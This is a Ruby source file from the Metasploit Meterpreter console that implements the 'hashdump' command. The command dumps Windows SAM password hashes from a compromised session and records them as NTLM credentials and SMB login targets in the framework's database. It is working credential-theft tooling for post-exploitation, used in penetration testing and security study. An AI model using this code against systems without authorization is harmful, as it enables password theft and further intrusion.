# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The password database portion of the privilege escalation extension.
#
###
class Console::CommandDispatcher::Priv::Passwd

  Klass = Console::CommandDispatcher::Priv::Passwd

  include Console::CommandDispatcher

  #
  # List of supported commands.
  #
  def commands
    {
      'hashdump' => 'Dumps the contents of the SAM database'
    }
  end

  #
  # Name for this dispatcher.
  #
  def name
    'Priv: Password database'
  end

  #
  # Displays the contents of the SAM database
  #
  def cmd_hashdump(*args)
    client.priv.sam_hashes.each { |user|
      print_line("#{user}")
      if shell.client.platform == 'windows' && !shell.framework.nil? && shell.framework.db.active
        report_creds(user)
      end
    }

    return true
  end

  def report_creds(user_data)
    user = user_data.user_name
    lm_hash = user_data.lanman.downcase
    nt_hash = user_data.ntlm.downcase
    empty_password = lm_hash == Metasploit::Credential::NTLMHash::BLANK_LM_HASH && nt_hash == Metasploit::Credential::NTLMHash::BLANK_NT_HASH
    return if (user.empty? || empty_password)

    # Assemble data about the credential objects we will be creating
    credential_data = {
      origin_type: :session,
      post_reference_name: 'hashdump',
      private_data: "#{lm_hash}:#{nt_hash}",
      private_type: :ntlm_hash,
      session_id: client.db_record.id,
      username: user,
      workspace_id: shell.framework.db.workspace.id
    }

    credential_core = shell.framework.db.create_credential(credential_data)

    # Assemble the options hash for creating the Metasploit::Credential::Login object
    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      address: ::Rex::Socket.getaddress(client.sock.peerhost, true),
      port: 445,
      service_name: 'smb',
      protocol: 'tcp',
      workspace_id: shell.framework.db.workspace.id
    }

    shell.framework.db.create_credential_login(login_data)
  end
end
end
end
end
end